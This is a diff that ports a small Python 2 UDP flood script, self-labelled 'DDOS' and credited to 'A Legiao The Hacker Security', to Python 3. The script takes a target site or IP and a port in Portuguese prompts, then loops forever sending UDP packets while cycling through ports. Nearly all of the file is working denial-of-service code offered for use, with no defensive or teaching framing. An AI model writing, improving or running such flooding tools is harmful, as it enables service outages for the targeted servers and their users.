@@ -1,6 +1,5 @@
-                                             
 #-*- coding: utf-8 -*-  
-#!/usr/bin/python2                                                  
+#!/usr/bin/python3                                                  
 ########################
 
 ###############################################
@@ -28,7 +27,7 @@ Grey = '\033[90m'
 Black = '\033[90m'
 Default = '\033[99m'
 
-print \
+print(\
 """{1}
     _      _     _____ ____ ___    _    ___    _____ _   _ _____ 
    / \    | |   | ____/ ___|_ _|  / \  / _ \  |_   _| | | | ____|
@@ -48,25 +47,25 @@ print \
  ___) | |__| |___| |_| |  _ < | |  | |   | |  
 |____/|_____\____|\___/|_| \_\___| |_|   |_| "DDOS_Copyriyt_2019 "  {2}
                                             
-""".format(Blue, Green, Cyan)
-print '---------------------------------------------------'
+""".format(Blue, Green, Cyan))
+print('---------------------------------------------------')
 
 
 
 
-ip = raw_input('Digite o site ou ip: ')
-port = input('Digite a porta: ')
+ip = input('Digite o site ou ip: ')
+port = int(input('Digite a porta: '))
 sent = 0
 
-print '[!] Realizando ataque!'
+print('[!] Realizando ataque!')
 time.sleep(3)
 
 while True:
     s.sendto(bytes, (ip, port))
     sent = sent + 1
     port = port + 1
-    print '[!] Foram enviados %s bytes no servidor %s na porta %s'%(sent,ip,port)
-    print '[!] A Legiao The Hacker Security '
+    print('[!] Foram enviados {} bytes no servidor {} na porta {}'.format(sent,ip,port))
+    print('[!] A Legiao The Hacker Security ')
 if port == 99999:
     port = 1
 
